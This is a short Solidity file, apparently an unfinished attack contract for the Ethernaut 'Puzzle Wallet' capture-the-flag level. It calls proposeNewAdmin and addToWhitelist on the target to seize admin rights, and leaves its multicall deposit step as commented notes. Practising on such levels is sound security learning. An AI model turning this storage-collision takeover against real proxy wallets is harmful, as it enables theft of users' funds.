// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";
import "interfaces/ipuzzlewallet.sol";


contract Attack24 {
    PuzzleWallet target;

    constructor(address _targetAddress) {
        target = PuzzleWallet(_targetAddress);        
    }

    function attack(IPuzzleWallet) public {
        // multicall attack
        // bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
        // set the data argument as a abi encoded multicall to deposit
        // target.multicall(data);
        target.proposeNewAdmin(msg.sender);
        target.addToWhitelist(msg.sender);
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }



